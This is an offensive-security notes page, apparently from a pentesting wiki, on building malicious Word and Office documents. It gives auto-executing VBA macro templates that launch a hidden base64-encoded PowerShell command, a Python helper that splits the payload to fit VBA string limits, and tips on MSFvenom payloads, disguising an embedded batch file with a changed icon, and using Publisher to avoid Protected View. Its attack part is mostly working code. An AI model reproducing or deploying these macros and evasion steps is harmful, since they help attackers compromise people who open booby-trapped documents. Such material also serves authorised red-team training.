# Macros

### Macros

We must save the containing document as either .docm or the older .doc format, which supports embedded macros, but we can't use the .docx format because it does not support them.

### Microsoft Word Macro Skeleton

View -> Macros -> Macros in Document -> Name -> Create

```visual-basic
Sub AutoOpen()
    RevMacro
End Sub

Sub Document_Open()
    RevMacro
End Sub

Sub RevMacro()
    Dim Str As String
    <payload here>
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Functions Purposes:

* AutoOpen() = Open when a new document is opened
* Document\_Open() = Executed when Reopened
* CreateObject("Wscript.Shell").Run Str = Runs the payload
* Save As: Word 97-2003 Document

Save the document as `.docm` (Word Macro-Enabled Document) or older `.doc` (Word 97-2003 Document) and **NOT** as `.docx` format

💡 We can use the base64-encoded PowerShell payload of `MSFvenom` when generating a malicious HTA application.

{% hint style="info" %}
VBA has a 255-character limit for literal strings to solve this problem we can split the PowerShell command into multiple lines via a Python script:
{% endhint %}

```python
str = "powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>"
n = 50
print(f'Str = "{str[:50]}"')
for i in range(50, len(str), n):
    print(f'Str = Str + "{str[i:i+n]}"')
```

```visual-basic
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String
	
	Str = "powershell.exe -nop -w hidden -e <SPLITTED_BASE64_PAYLOAD>"
	Str = Str + "<SPLITTED_BASE64_PAYLOAD>"
	...
	CreateObject("Wscript.Shell").Run Str
End Sub
```

> **Note**: the macro security warning only re-appears if the name of the document is changed.

* Embedding/Linking Object using Batch file:
* Word or Excel:
* _Insert > Object > Create from File_
* Import a Batch File

```batch
START powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>
```

💡 **Tip**: _Display as icon > Change Icon_

* [**Protected View**](https://support.microsoft.com/en-us/topic/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653?ui=en-us\&rs=en-us\&ad=us) Bypass: a sandbox feature that disables all editing and modifications in the document + blocks the execution of macros or embedded objects.

Malicious office docs are effective when served locally but when served from the Internet, i.e, an email download link, **Protected View** is enabled. However, **Microsoft Publisher** does not enable it so use Publisher instead.
